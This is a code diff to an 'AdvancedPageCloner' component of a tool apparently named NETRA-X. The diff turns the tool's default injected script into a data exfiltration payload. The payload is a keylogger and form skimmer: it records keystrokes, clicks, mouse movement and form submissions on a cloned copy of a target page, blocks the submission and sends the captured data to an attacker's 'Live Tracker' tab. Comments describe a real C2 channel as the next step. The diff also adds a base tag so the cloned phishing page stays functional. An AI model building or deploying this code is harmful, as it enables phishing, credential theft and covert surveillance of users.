@@ -24,41 +24,73 @@ const formSchema = z.object({
 });
 
 const defaultJsPayload = `
-// This script logs various user interactions to the browser console.
-// Open the developer console on the target page to see the output.
+// NETRA-X Advanced Data Exfiltration Payload
 (function() {
-    console.log('[NETRA-X] Advanced monitoring script injected.');
+    // A real-world C2 channel would be a WebSocket or frequent fetch/XHR calls.
+    // For this simulation, we use BroadcastChannel to send data to the attacker's
+    // 'Live Tracker' UI running in another tab in the same browser.
+    const channel = new BroadcastChannel('netrax_c2_channel');
+    
+    // Assign a unique ID to this "victim" session
+    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    
+    function exfiltrate(type, data) {
+        const payload = {
+            sessionId: sessionId,
+            type: type,
+            data: data,
+            timestamp: new Date().toISOString(),
+            url: window.location.href,
+            userAgent: navigator.userAgent,
+        };
+        channel.postMessage(payload);
+        console.log('Exfiltrating:', payload);
+    }
+
+    exfiltrate('connection', { message: 'Payload activated on page.' });
+
+    // --- Keystrokes ---
+    document.addEventListener('keydown', (e) => {
+        let value = e.key;
+        if (e.target.type === 'password') {
+            value = '[PASSWORD_FIELD]';
+        }
+        exfiltrate('keystroke', { 
+            key: value, 
+            target: e.target.name || e.target.id || e.target.tagName 
+        });
+    }, true);
+
+    // --- Clicks ---
+    document.addEventListener('click', (e) => {
+        exfiltrate('click', { 
+            x: e.clientX, 
+            y: e.clientY, 
+            target: e.target.tagName,
+            id: e.target.id || 'none',
+            text: e.target.innerText ? e.target.innerText.substring(0, 50) : ''
+        });
+    }, true);
 
     // --- Mouse Movement ---
     let lastMove = 0;
     document.addEventListener('mousemove', (e) => {
-        const now = Date.now();
-        if (now - lastMove > 100) { // Throttle logging to every 100ms
-            console.log(\`[Mouse Move] X: \${e.clientX}, Y: \${e.clientY}\`);
-            lastMove = now;
+        if (Date.now() - lastMove > 200) { // Throttle logging
+            exfiltrate('mousemove', { x: e.clientX, y: e.clientY });
+            lastMove = Date.now();
         }
     });
 
-    // --- Clicks ---
-    document.addEventListener('click', (e) => {
-        console.log(\`[Click] Tag: \${e.target.tagName}, ID: \${e.target.id || 'none'}, Class: \${e.target.className || 'none'}\`);
+    // --- Form Submissions ---
+    document.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const formData = new FormData(e.target);
+        const data = Object.fromEntries(formData.entries());
+        exfiltrate('form-submit', { data });
+        // In a real attack, you might let the form submit after a delay.
+        // For this demo, we just capture and log.
+        console.log('Form submission intercepted:', data);
     }, true);
-
-    // --- Keystrokes ---
-    document.addEventListener('keydown', (e) => {
-        // Avoid logging passwords if we can identify the input type
-        if (e.target.type === 'password') {
-             console.log('[Keystroke] In a password field.');
-        } else {
-             console.log(\`[Keystroke] Key: "\${e.key}" in field: \${e.target.name || e.target.id || 'unknown'}\`);
-        }
-    });
-
-     // --- Form Submissions ---
-     document.addEventListener('submit', (e) => {
-        console.log('[Form Submit] Intercepted submission for form:', e.target);
-    }, true);
-
 })();
 `;
 
@@ -95,6 +127,13 @@ export function AdvancedPageCloner() {
           html = html.replace(/<\/body>/i, `${scriptToInject}</body>`);
       } else {
           html += scriptToInject;
+      }
+      
+      // Inject base tag to fix relative links
+      if (html.includes('<head>')) {
+        html = html.replace(/<head>/i, `<head>\\n<base href="${values.targetUrl}">`);
+      } else {
+        html = `<head><base href="${values.targetUrl}"></head>${html}`;
       }
       
       setModifiedHtml(html);
@@ -165,7 +204,7 @@ export function AdvancedPageCloner() {
                   <FormControl>
                     <Textarea placeholder="// Your custom JS code here..." {...field} className="font-mono h-48"/>
                   </FormControl>
-                   <CardDescription>The output of this script will appear in the developer console of the victim's browser on the generated page.</CardDescription>
+                   <CardDescription>The output of this script will be sent to the <Link href="/live-tracker" className="text-accent underline">Live Tracker</Link> page.</CardDescription>
                   <FormMessage />
                 </FormItem>
               )}
